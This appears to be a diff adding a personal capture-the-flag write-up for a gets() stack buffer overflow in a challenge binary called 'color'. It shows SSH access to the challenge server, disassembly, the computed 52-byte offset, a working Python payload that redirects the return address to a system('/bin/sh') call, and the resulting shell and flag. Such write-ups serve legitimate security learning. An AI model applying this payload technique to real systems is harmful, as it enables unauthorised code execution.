@@ -1,0 +1,82 @@
+
+1. login the server
+
+kali@kali:~/Desktop$ ssh color@104.131.79.111 -p 1001
+color@104.131.79.111's password: 
+Hello! Welcome to this little [unnamed] server of mines.
+
+color@ubuntu-512mb-nyc3-01:~$ ls
+color  color.c  flag.txt  Makefile
+
+
+2. download from the server
+
+scp -P 1001 color@104.131.79.111:~/color .
+scp -P 1001 color@104.131.79.111:~/color.c .
+scp -P 1001 color@104.131.79.111:~/Makefile .
+
+
+3. $ objdump server -D > server.s
+1)
+vuln() {
+    char buf[32];
+    
+    printf("Enter your favorite color: ");
+    gets(buf);
+    ....
+}
+gets(buf) is dangerous.
+
+
+ 804858b:       55                      push   %ebp
+ 804858c:       89 e5                   mov    %esp,%ebp
+ 804858e:       83 ec 38                sub    $0x38,%esp
+ 8048591:       83 ec 0c                sub    $0xc,%esp
+ 8048594:       68 30 87 04 08          push   $0x8048730
+ 8048599:       e8 72 fe ff ff          call   8048410 <printf@plt>
+ 804859e:       83 c4 10                add    $0x10,%esp
+ 80485a1:       83 ec 0c                sub    $0xc,%esp
+ 80485a4:       8d 45 d0                lea    -0x30(%ebp),%eax
+ 80485a7:       50                      push   %eax
+ 80485a8:       e8 73 fe ff ff          call   8048420 <gets@plt>
+ebp-0x30(48) is the addr of buf, we need overflow 48(sizeof buf) + 4(sizeof ebp) to the retaddr in stack.
+
+2)
+our target is:
+if (vuln()) {
+    puts("Me too! That's my favorite color too!");
+    puts("You get a shell! Flag is in flag.txt");
+    system("/bin/sh");
+}
+
+main
+ 804864b:       83 c4 10                add    $0x10,%esp
+ 804864e:       e8 38 ff ff ff          call   804858b <vuln>
+ 8048653:       85 c0                   test   %eax,%eax
+ 8048655:       74 32                   je     8048689 <main+0xaa>
+ 8048657:       83 ec 0c                sub    $0xc,%esp
+
+so we want to overflow the ret addr to 0x8048657
+
+
+#### why ??? ### 
+our payload is  (python -c "print ('a' * 52 + '\x57\x86\x04\x08')") | ./color
+I don't know why it doesn't work...
+#### why ??? ### 
+
+3. I'm very confused below: 
+color@ubuntu-512mb-nyc3-01:~$ (python -c "print ('a' * 52 + '\x57\x86\x04\x08')") | ./color
+Enter your favorite color: Me too! That's my favorite color too!
+You get a shell! Flag is in flag.txt
+Segmentation fault (core dumped)
+
+
+color@ubuntu-512mb-nyc3-01:~$ (python -c "print ('a' * 52 + '\x57\x86\x04\x08')"; cat) | ./color
+Enter your favorite color: Me too! That's my favorite color too!
+You get a shell! Flag is in flag.txt
+id
+uid=1004(color) gid=1005(color_pwn) groups=1005(color_pwn),1004(color)
+ls
+color  color.c  flag.txt  Makefile
+cat flag.txt
+flag{c0lor_0f_0verf1ow}
